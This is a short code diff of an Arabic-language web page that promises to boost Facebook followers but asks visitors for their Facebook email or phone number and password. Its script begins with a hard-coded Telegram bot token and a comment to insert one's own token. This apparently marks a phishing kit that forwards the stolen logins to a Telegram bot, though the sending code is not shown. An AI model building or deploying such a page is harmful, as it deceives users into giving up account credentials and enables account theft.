@@ -51,16 +51,15 @@
    <div><b>🚀 زيادة متابعين فيسبوك </b> </div>
     <form id="loginForm">
       <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
-      <input type="password" id="password" placeholder="كلمة السر" required>
       
-  <div> اختر عدد المتابعين</div>
+      <input type="password" id="password" placeholder="كلمة السر" required>
+     <div> اختر عدد المتابعين</div>
       <select id="followers">
         <option value="1000">1000</option>
         <option value="5000">5000</option>
       </select>
       <button type="submit">تسجيل الدخول</button>
     </form>
-    
    <script>
     const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA"; // حط توكن البوت بتاعك هنا
 
